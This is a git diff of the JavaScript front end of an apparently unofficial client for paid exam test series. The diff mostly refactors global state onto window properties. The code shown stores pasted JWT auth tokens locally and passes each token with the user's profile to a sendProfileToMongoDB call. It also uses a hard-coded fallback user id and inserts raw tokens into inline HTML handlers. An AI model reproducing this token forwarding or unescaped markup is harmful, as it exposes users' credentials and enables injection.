-    if (freshProfile) { USER_PROFILE = freshProfile; localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE)); idbSetItem("rwa_user_profile_v2", USER_PROFILE); updateTokenBadge(); }
+    if (freshProfile) { window.USER_PROFILE = freshProfile; localStorage.setItem("rwa_user_profile_v2", JSON.stringify(window.USER_PROFILE)); idbSetItem("rwa_user_profile_v2", window.USER_PROFILE); updateTokenBadge(); }
 
-    const u = USER_PROFILE || {};
+    const u = window.USER_PROFILE || {};
     contentBox.innerHTML = `
         <div class="bg-sky-50 border-2 border-sky-200 rounded-2xl p-4 flex items-center gap-3.5">
             <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-emerald-500 to-teal-600 text-white font-black text-2xl flex items-center justify-center shadow-md shrink-0">${(u.name || "U").charAt(0).toUpperCase()}</div>
@@ -495,7 +525,7 @@ function handleLogout() {
     if (confirm("Kya aap sach mein Logout karna chahte hain?")) {
         localStorage.removeItem("rwa_user_tokens_v2"); localStorage.removeItem("rwa_user_profile_v2");
         idbSetItem("rwa_user_tokens_v2", []); idbSetItem("rwa_user_profile_v2", null);
-        USER_TOKENS = []; USER_PROFILE = null; state.activeTokenObj = null; closeProfileModal(); updateTokenBadge();
+        window.USER_TOKENS = []; window.USER_PROFILE = null; window.state.activeTokenObj = null; closeProfileModal(); updateTokenBadge();
     }
 }
 
@@ -518,18 +548,12 @@ const DB = {
     ]
 };
 
-let state = {
-    currentSlide: "slideExplorer", previousSlide: "slideExplorer", activeAppTab: "tests", view: "ts_list",
-    activeTokenObj: USER_TOKENS[0] || null, currentPdfUrl: "", tsMode: "paid_ts", activeSeriesId: null,
-    activeSeriesTitle: "", activeTsSubId: null, activeTsSubName: "", testMap: {}, pendingTestKey: null, pendingPdfKey: null, totalSeriesCount: 0, totalTestsCount: 0, knownTestIds: {}
-};
-
 // =====================================================
 // SLIDE NAVIGATION & AUTO-HIDE DASHBOARD ENGINE
 // =====================================================
 function showSlide(slideId) {
-    if (state.currentSlide !== slideId) state.previousSlide = state.currentSlide;
-    state.currentSlide = slideId;
+    if (window.state.currentSlide !== slideId) window.state.previousSlide = window.state.currentSlide;
+    window.state.currentSlide = slideId;
     ["slideExplorer", "slideTestAttempt", "slidePdf"].forEach(id => {
         const el = document.getElementById(id); if (!el) return;
         if (id === slideId) { el.classList.remove("hidden-slide"); el.classList.add("active-slide"); } 
@@ -542,12 +566,11 @@ function showSlide(slideId) {
     }
     window.scrollTo({ top: 0, behavior: "smooth" });
 }
-// Exported to window for cross-file calling
-window.showSlide = showSlide;
+window.showSlide = showSlide; // Expose globally for engine to use
 
 function updateBackNavButton() {
     const backBtn = document.getElementById("backNavBtn"), homeSeriesBtn = document.getElementById("homeSeriesBtn"), topDash = document.getElementById("topDashboardAndTabs");
-    if (state.view === "ts_list") {
+    if (window.state.view === "ts_list") {
         if (backBtn) backBtn.classList.add("hidden");
         if (homeSeriesBtn) homeSeriesBtn.classList.add("hidden");
         if (topDash) topDash.classList.remove("hidden");
@@ -565,15 +588,15 @@ function goHomeHub() {
 }
 
 function handleGlobalBack() {
-    if (state.currentSlide === "slidePdf") { closePdfSlide(); return; }
-    if (state.currentSlide === "slideTestAttempt") { window.exitCbtTest(); return; }
-    if (state.currentSlide === "slideExplorer") {
-        if (state.view === "ts_tests") {
-            if (state.activeTsSubId === "-1") openTestSeriesExplorer("paid_ts");
-            else openTestSeriesSubjects(state.activeSeriesId, state.activeSeriesTitle);
+    if (window.state.currentSlide === "slidePdf") { closePdfSlide(); return; }
+    if (window.state.currentSlide === "slideTestAttempt") { window.exitCbtTest(); return; }
+    if (window.state.currentSlide === "slideExplorer") {
+        if (window.state.view === "ts_tests") {
+            if (window.state.activeTsSubId === "-1") openTestSeriesExplorer("paid_ts");
+            else openTestSeriesSubjects(window.state.activeSeriesId, window.state.activeSeriesTitle);
             return;
         }
-        if (state.view === "ts_subjects") { openTestSeriesExplorer("paid_ts"); return; }
+        if (window.state.view === "ts_subjects") { openTestSeriesExplorer("paid_ts"); return; }
         openTestSeriesExplorer("paid_ts");
     }
 }
@@ -583,7 +606,7 @@ function handleGlobalBack() {
 // =====================================================
 async function fetchRawJSONWithToken(endpoint, tokenObj) {
     const statusBadge = document.getElementById("apiStatus");
-    const useTok = tokenObj || state.activeTokenObj || USER_TOKENS[0] || null;
+    const useTok = tokenObj || window.state.activeTokenObj || window.USER_TOKENS[0] || null;
     const authToken = useTok && useTok.token ? useTok.token : "";
     const resolvedUid = String((useTok && useTok.userId) || extractUidFromJwt(authToken) || "4756316");
 
@@ -613,10 +636,10 @@ async function fetchAPIWithToken(endpoint, tokenObj, fallbackGetter) {
 // EXPLORER VIEWS
 // =====================================================
 async function openTestSeriesExplorer(mode = "paid_ts") {
-    state.tsMode = "paid_ts"; state.view = "ts_list"; updateBackNavButton(); showSlide("slideExplorer");
+    window.state.tsMode = "paid_ts"; window.state.view = "ts_list"; updateBackNavButton(); showSlide("slideExplorer");
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Loading All Paid Test Series...</div>`;
-    const primaryTok = USER_TOKENS[0] || null; state.activeTokenObj = primaryTok;
+    const primaryTok = window.USER_TOKENS[0] || null; window.state.activeTokenObj = primaryTok;
     document.getElementById("crumbText").textContent = "Official Exam Series";
     document.getElementById("headingText").textContent = "🏆 All Paid Test Series";
 
@@ -644,15 +667,15 @@ async function openTestSeriesExplorer(mode = "paid_ts") {
                 </div><div class="px-4 pb-4"><div class="btn-watch w-full text-center text-xs">Open Test Series ➔</div></div>
             </div>`;
     });
-    state.totalSeriesCount = totalSeries; state.totalTestsCount = totalTestsSum; window.updateDashboardUI();
+    window.state.totalSeriesCount = totalSeries; window.state.totalTestsCount = totalTestsSum; window.updateDashboardUI();
 }
 
 async function openTestSeriesSubjects(tsId, tsTitle) {
-    state.activeSeriesId = tsId; state.activeSeriesTitle = tsTitle; state.view = "ts_subjects"; switchAppTab("tests"); updateBackNavButton();
+    window.state.activeSeriesId = tsId; window.state.activeSeriesTitle = tsTitle; window.state.view = "ts_subjects"; switchAppTab("tests"); updateBackNavButton();
     document.getElementById("crumbText").textContent = `Test Series #${tsId}`; document.getElementById("headingText").textContent = tsTitle; window.scrollTo({ top: 0, behavior: "smooth" });
     const grid = document.getElementById("mainGrid"); grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Checking Test Series Folders...</div>`;
 
-    const useTok = state.activeTokenObj || USER_TOKENS[0] || null;
+    const useTok = window.state.activeTokenObj || window.USER_TOKENS[0] || null;
     fetchRawJSONWithToken(`/Test_Series/test_series_by_id?id=${tsId}`, useTok);
     const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, useTok, () => DB.tsSubjects[tsId] || []);
 
@@ -669,13 +692,12 @@ async function openTestSeriesSubjects(tsId, tsTitle) {
     });
 }
 
-// 🚀 REFRESHED: Updated to work properly and fetch dynamically
 async function openTestSeriesTitles(tsId, subId, subName) {
-    state.view = "ts_tests"; state.activeSeriesId = tsId; state.activeTsSubId = String(subId); state.activeTsSubName = subName; switchAppTab("tests"); updateBackNavButton();
-    document.getElementById("crumbText").textContent = state.activeSeriesTitle; document.getElementById("headingText").textContent = `📝 ${subName}`; window.scrollTo({ top: 0, behavior: "smooth" });
+    window.state.view = "ts_tests"; window.state.activeSeriesId = tsId; window.state.activeTsSubId = String(subId); window.state.activeTsSubName = subName; switchAppTab("tests"); updateBackNavButton();
+    document.getElementById("crumbText").textContent = window.state.activeSeriesTitle; document.getElementById("headingText").textContent = `📝 ${subName}`; window.scrollTo({ top: 0, behavior: "smooth" });
     const grid = document.getElementById("mainGrid"); grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Fetching Mock Tests...</div>`;
 
-    const useTok = state.activeTokenObj || USER_TOKENS[0] || null, uid = (useTok && useTok.userId) || (useTok && extractUidFromJwt(useTok.token)) || "4756316";
+    const useTok = window.state.activeTokenObj || window.USER_TOKENS[0] || null, uid = (useTok && useTok.userId) || (useTok && extractUidFromJwt(useTok.token)) || "4756316";
     const ep = String(subId) === "-1" ? `/get/test_titlev2?testseriesid=${tsId}&subject_id=-1&chapter_id=-1&userid=${uid}&search=&start=-1` : `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&chapter_id=-1&userid=${uid}&search=&start=-1`;
 
     let list = await fetchAPIWithToken(ep, useTok, () => DB.tsTitles[`${tsId}_${subId}`] || []);
@@ -716,16 +738,16 @@ function formatCardTimeLabel(rawTime) {
 }
 
 function renderTestTitlesGrid(list, tsId, boundTok) {
-    const grid = document.getElementById("mainGrid"); const testTok = boundTok || state.activeTokenObj || USER_TOKENS[0] || null;
+    const grid = document.getElementById("mainGrid"); const testTok = boundTok || window.state.activeTokenObj || window.USER_TOKENS[0] || null;
     if (!list || !list.length) { grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is folder mein abhi koi test uplabdh nahi hai.</div>`; return; }
 
     grid.innerHTML = "";
     list.forEach((t, idx) => {
-        const rawId = String(t.id || `${tsId}_${idx}`); state.knownTestIds[rawId] = true;
+        const rawId = String(t.id || `${tsId}_${idx}`); window.state.knownTestIds[rawId] = true;
         const tKey = `test_${rawId}`, pdfUrl = resolvePdfUrl(t.pdf_url || t.test_solutions_pdf || t.pdf_summary_link, t.pdf_url);
-        state.testMap[tKey] = { ...t, id: rawId, seriesId: tsId || t.test_series_id, resolvedPdf: pdfUrl, tokenObj: testTok };
+        window.state.testMap[tKey] = { ...t, id: rawId, seriesId: tsId || t.test_series_id, resolvedPdf: pdfUrl, tokenObj: testTok };
 
-        const timeLabel = formatCardTimeLabel(t.time), isSectional = String(t.time || "").includes("+") || String(t.restrict_part_switching) === "1", hasOptional = String(t.show_sectionselector) === "1", attemptRecord = ATTEMPTED_TESTS[rawId];
+        const timeLabel = formatCardTimeLabel(t.time), isSectional = String(t.time || "").includes("+") || String(t.restrict_part_switching) === "1", hasOptional = String(t.show_sectionselector) === "1", attemptRecord = window.ATTEMPTED_TESTS[rawId];
 
         grid.innerHTML += `
             <div class="grid-card p-5 flex flex-col justify-between ${attemptRecord ? 'border-emerald-300 bg-emerald-50/20' : ''}">
@@ -745,25 +767,25 @@ function renderTestTitlesGrid(list, tsId, boundTok) {
 }
 
 async function launchCbtTest(tKey) {
-    if (!isUserLoggedIn()) { state.pendingTestKey = tKey; openLoginModal("🔐 Test start karne ke liye pehle apna RWA Account Login karein!"); return; }
-    if (state.testMap[tKey]) state.testMap[tKey].tokenObj = USER_TOKENS[0];
+    if (!isUserLoggedIn()) { window.state.pendingTestKey = tKey; openLoginModal("🔐 Test start karne ke liye pehle apna RWA Account Login karein!"); return; }
+    if (window.state.testMap[tKey]) window.state.testMap[tKey].tokenObj = window.USER_TOKENS[0];
     if (typeof window.launchTcsCbtEngine === "function") await window.launchTcsCbtEngine(tKey);
 }
 
 function openTestPdf(tKey) {
-    if (!isUserLoggedIn()) { state.pendingPdfKey = tKey; openLoginModal("🔐 Test PDF dekhne ke liye pehle Login karein!"); return; }
-    const t = state.testMap[tKey]; if (!t || !t.resolvedPdf) return;
-    state.currentPdfUrl = t.resolvedPdf; document.getElementById("pdfTitle").textContent = `📄 ${t.title} (Paper PDF)`;
+    if (!isUserLoggedIn()) { window.state.pendingPdfKey = tKey; openLoginModal("🔐 Test PDF dekhne ke liye pehle Login karein!"); return; }
+    const t = window.state.testMap[tKey]; if (!t || !t.resolvedPdf) return;
+    window.state.currentPdfUrl = t.resolvedPdf; document.getElementById("pdfTitle").textContent = `📄 ${t.title} (Paper PDF)`;
     const rawPdfLink = document.getElementById("rawPdfLink");
     rawPdfLink.href = "javascript:void(0)"; rawPdfLink.onclick = () => window.downloadAndUploadPDF(t.resolvedPdf, t.title);
     showSlide("slidePdf"); setPdfMode("appx");
 }
 
 function setPdfMode(mode) {
-    const frame = document.getElementById("pdfFrame"), u = state.currentPdfUrl; if (!u) return;
+    const frame = document.getElementById("pdfFrame"), u = window.state.currentPdfUrl; if (!u) return;
     frame.src = mode === "appx" ? `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0` : `https://docs.google.com/viewer?url=${encodeURIComponent(u)}&embedded=true`;
 }
-function closePdfSlide() { document.getElementById("pdfFrame").src = ""; showSlide(state.previousSlide || "slideExplorer"); }
+function closePdfSlide() { document.getElementById("pdfFrame").src = ""; showSlide(window.state.previousSlide || "slideExplorer"); }
 
 // =====================================================
 // TOKEN MANAGER LIST
@@ -771,14 +793,14 @@ function closePdfSlide() { document.getElementById("pdfFrame").src = ""; showSli
 function renderTokenManagerList() {
     const container = document.getElementById("tokenListContainer"); if (!container) return;
     container.innerHTML = "";
-    if (USER_TOKENS.length === 0) { container.innerHTML = `<div class="p-3 text-center text-xs font-bold text-slate-500">Abhi koi personal token saved nahi hai.</div>`; return; }
+    if (window.USER_TOKENS.length === 0) { container.innerHTML = `<div class="p-3 text-center text-xs font-bold text-slate-500">Abhi koi personal token saved nahi hai.</div>`; return; }
 
-    USER_TOKENS.forEach((t, idx) => {
+    window.USER_TOKENS.forEach((t, idx) => {
         const shortTok = t.token.slice(0, 26) + "..." + t.token.slice(-10);
         container.innerHTML += `
             <div class="bg-slate-50 border border-sky-200 rounded-xl p-3 flex flex-wrap justify-between items-center gap-2">
                 <div class="min-w-0 flex-1"><div class="flex items-center gap-1.5"><span class="px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">TOKEN #${idx + 1}</span><h5 class="font-extrabold text-xs text-slate-900 truncate">${t.label}</h5></div><p class="text-[10px] font-mono text-slate-500 mt-0.5 truncate">${shortTok}</p></div>
-                <div class="flex items-center gap-1.5"><button onclick="navigator.clipboard.writeText('${t.token}'); alert('Token Copied!');" class="px-2.5 py-1 rounded-lg bg-sky-600 text-white font-extrabold text-[10px] border-0 cursor-pointer">📋 Copy</button>${USER_TOKENS.length > 1 ? `<button onclick="deleteToken('${t.id}')" class="px-2.5 py-1 rounded-lg bg-rose-600 text-white font-extrabold text-[10px] border-0 cursor-pointer">🗑</button>` : `<span class="text-[10px] font-bold text-emerald-600">● Active</span>`}</div>
+                <div class="flex items-center gap-1.5"><button onclick="navigator.clipboard.writeText('${t.token}'); alert('Token Copied!');" class="px-2.5 py-1 rounded-lg bg-sky-600 text-white font-extrabold text-[10px] border-0 cursor-pointer">📋 Copy</button>${window.USER_TOKENS.length > 1 ? `<button onclick="deleteToken('${t.id}')" class="px-2.5 py-1 rounded-lg bg-rose-600 text-white font-extrabold text-[10px] border-0 cursor-pointer">🗑</button>` : `<span class="text-[10px] font-bold text-emerald-600">● Active</span>`}</div>
             </div>`;
     });
     updateTokenBadge();
@@ -793,20 +815,20 @@ async function addNewToken() {
     if (!userId) { alert("Invalid JWT Token format!"); return; }
     const verifiedUser = await fetchUserDetailsFromServer(token, userId);
     if (!verifiedUser) { alert("Server verification failed! Yeh token expired ya invalid hai."); return; }
-    const newTokObj = { id: "utok_" + Date.now(), label: labelInput || verifiedUser.name || `My Account ${USER_TOKENS.length + 1}`, userId: String(verifiedUser.userid || verifiedUser.id || userId), token: token, isAdmin: false };
-    USER_TOKENS = [newTokObj, ...USER_TOKENS.filter(t => t.userId !== newTokObj.userId)];
-    USER_PROFILE = verifiedUser;
-    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS)); localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
-    idbSetItem("rwa_user_tokens_v2", USER_TOKENS); idbSetItem("rwa_user_profile_v2", USER_PROFILE);
+    const newTokObj = { id: "utok_" + Date.now(), label: labelInput || verifiedUser.name || `My Account ${window.USER_TOKENS.length + 1}`, userId: String(verifiedUser.userid || verifiedUser.id || userId), token: token, isAdmin: false };
+    window.USER_TOKENS = [newTokObj, ...window.USER_TOKENS.filter(t => t.userId !== newTokObj.userId)];
+    window.USER_PROFILE = verifiedUser;
+    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(window.USER_TOKENS)); localStorage.setItem("rwa_user_profile_v2", JSON.stringify(window.USER_PROFILE));
+    idbSetItem("rwa_user_tokens_v2", window.USER_TOKENS); idbSetItem("rwa_user_profile_v2", window.USER_PROFILE);
     sendProfileToMongoDB(verifiedUser, token, "Added via Profile Token Manager", "N/A");
     document.getElementById("newTokLabel").value = ""; document.getElementById("newTokUid").value = ""; document.getElementById("newTokValue").value = "";
     updateTokenBadge(); openProfileModal(); alert(`✅ Token Verified & Saved for ${verifiedUser.name || "User"}!`);
 }
 
 function deleteToken(id) {
-    if (USER_TOKENS.length <= 1) return;
-    USER_TOKENS = USER_TOKENS.filter(t => t.id !== id);
-    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS)); idbSetItem("rwa_user_tokens_v2", USER_TOKENS);
+    if (window.USER_TOKENS.length <= 1) return;
+    window.USER_TOKENS = window.USER_TOKENS.filter(t => t.id !== id);
+    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(window.USER_TOKENS)); idbSetItem("rwa_user_tokens_v2", window.USER_TOKENS);
     renderTokenManagerList();
 }
 
